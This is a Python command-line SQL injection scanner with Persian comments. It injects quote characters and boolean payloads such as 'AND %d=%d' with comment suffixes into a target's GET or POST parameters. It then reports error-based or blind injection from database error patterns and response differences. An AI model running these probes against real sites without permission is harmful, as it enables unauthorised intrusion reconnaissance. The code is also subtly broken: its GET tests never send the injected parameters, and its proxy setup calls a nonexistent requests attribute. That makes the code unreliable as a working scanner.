#!/usr/bin/python3
import difflib
import itertools
import random
import re
import requests
from colorama import Fore, init

init()

# ثابت‌ها
PREFIXES = (" ", ") ", "' ", "') ")
SUFFIXES = ("", "-- -", "#", "%%16")
TAMPER_SQL_CHAR_POOL = ('(', ')', '\'', '"')
BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d>%d)")
HEADERS = {}
FUZZY_THRESHOLD = 0.95
TIMEOUT = 30
RANDINT = random.randint(1, 255)
BLOCKED_IP_REGEX = r"(?i)(\A|\b)IP\b.*\b(banned|blocked|bl(a|o)ck\s?list|firewall)"

# دیتابیس‌ها و الگوهای خطا
DBMS_ERRORS = {
    "MySQL": (r"You have an error in your SQL syntax", r"MySQLSyntaxErrorException", r"com\.mysql\.jdbc"),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"org\.postgresql\.util\.PSQLException"),
    "Microsoft SQL Server": (r"Unclosed quotation mark after the character string", r"Microsoft SQL Native Client error"),
    "Oracle": (r"ORA-\d{5}", r"Oracle.*Driver"),
    "SQLite": (r"SQLite.*Exception", r"sqlite3\.OperationalError"),
}

def _retrieve_content(url, data=None, method="GET"):
    """ دریافت محتوای صفحه با requests """
    try:
        if method == "POST":
            resp = requests.post(url, data=data, headers=HEADERS, timeout=TIMEOUT)
        else:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        
        html = resp.text or ""
        
        # بررسی بلاک شدن
        if re.search(BLOCKED_IP_REGEX, html):
            return None
        
        # حذف بازتاب payload
        html = re.sub(r"(?i)[^>]*(AND|OR)[^<]*%d[^<]*" % RANDINT, "__REFLECTED__", html)
        
        title_match = re.search(r"<title>(?P<result>[^<]+)</title>", html, re.I)
        title = title_match.group("result") if title_match else None
        
        text_only = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", html)
        
        return {
            "status": resp.status_code,
            "title": title,
            "html": html,
            "text": text_only
        }
    except Exception as e:
        return {"status": None, "title": None, "html": str(e), "text": ""}

def scan_page(url, data=None):
    """ اسکن برای SQLi """
    found_vuln = False
    usable = False
    
    for phase in ("GET", "POST"):
        params = url if phase == "GET" else (data or "")
        
        for match in re.finditer(r"((\A|[?&])(?P<param>\w+)=)(?P<value>[^&#]+)", params):
            param = match.group("param")
            usable = True
            print(Fore.MAGENTA + f"[*] Scanning {phase} parameter '{param}'")
            
            # پاسخ اصلی
            original = _retrieve_content(url, data, method=phase)
            if not original:
                continue
            
            # تست خطای دیتابیس
            tampered = params.replace(match.group(0),
                                      f"{match.group(0)}{''.join(random.sample(TAMPER_SQL_CHAR_POOL, len(TAMPER_SQL_CHAR_POOL)))}")
            
            tampered_resp = _retrieve_content(url if phase == "GET" else url, 
                                              tampered if phase == "POST" else None, 
                                              method=phase)
            
            if tampered_resp:
                for dbms, regexes in DBMS_ERRORS.items():
                    for regex in regexes:
                        if re.search(regex, tampered_resp["html"], re.I) and not re.search(regex, original["html"], re.I):
                            print(Fore.GREEN + f"\n[+] {phase} parameter '{param}' is error-based SQLi vulnerable ({dbms})")
                            found_vuln = True
            
            # تست Blind SQLi
            for prefix, boolean, suffix, inline_comment in itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES, (False, True)):
                template = f"{prefix}{boolean}{suffix}".replace(" " if inline_comment else "/**/", "/**/")
                payloads = {
                    True: params.replace(match.group(0),
                                         f"{match.group(0)}{requests.utils.quote(template % (RANDINT, RANDINT), safe='%')}"),
                    False: params.replace(match.group(0),
                                          f"{match.group(0)}{requests.utils.quote(template % (RANDINT + 1, RANDINT), safe='%')}")
                }
                
                responses = {k: _retrieve_content(url, v if phase == "POST" else None, method=phase) 
                             for k, v in payloads.items()}
                
                if not all(responses.values()):
                    continue
                
                # کاهش false positive: بررسی تغییرات قابل توجه
                ratios = {k: difflib.SequenceMatcher(None, original["text"], responses[k]["text"]).quick_ratio() 
                          for k in (True, False)}
                
                if min(ratios.values()) < FUZZY_THRESHOLD < max(ratios.values()) and abs(ratios[True] - ratios[False]) > 0.1:
                    print(Fore.GREEN + f"\n[+] {phase} parameter '{param}' appears to be blind SQLi vulnerable")
                    found_vuln = True
    
    if not usable:
        print(" (x) No usable GET/POST parameters found")
    
    return found_vuln

def init_options(proxy=None, cookie=None, ua=None, referer=None):
    global HEADERS
    HEADERS = {}
    if cookie: HEADERS["Cookie"] = cookie
    if ua: HEADERS["User-Agent"] = ua
    if referer: HEADERS["Referer"] = referer
    if proxy:
        requests.proxies.update({"http": proxy, "https": proxy})

if __name__ == "__main__":
    import optparse
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    parser.add_option("--data", dest="data", help="POST data (e.g. \"query=test\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--user-agent", dest="ua", help="HTTP User-Agent header value")
    parser.add_option("--referer", dest="referer", help="HTTP Referer header value")
    parser.add_option("--proxy", dest="proxy", help="HTTP proxy address (e.g. \"http://127.0.0.1:8080\")")
    
    options, _ = parser.parse_args()
    
    if options.url:
        init_options(options.proxy, options.cookie, options.ua, options.referer)
        result = scan_page(options.url if options.url.startswith("http") else "http://" + options.url, options.data)
        print(Fore.MAGENTA + f"\n[*] Scan results: {'possible vulnerabilities found' if result else 'no vulnerabilities'}")
    else:
        parser.print_help()
